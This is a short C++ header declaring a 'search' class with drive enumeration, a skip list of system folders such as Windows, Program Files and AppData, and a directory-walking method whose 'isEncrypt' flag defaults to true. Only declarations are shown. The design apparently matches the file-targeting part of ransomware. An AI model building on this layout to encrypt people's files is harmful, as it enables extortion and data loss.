#pragma once

#include <iostream>
#include <fstream>
#include <string>

class search {
	char driveBuffer[100];
	std::vector<std::string> dirSkipList{ "Windows", "Program Files", "Program Files (x86)", "Program Data", "Temp", "AppData", "SteamLibrary" };

public:
	std::string SystemDrive[30];

	void getDrive();
	void isCSysDir();
	void searchInDir(std::filesystem::path& path, bool isEncrypt = true);

};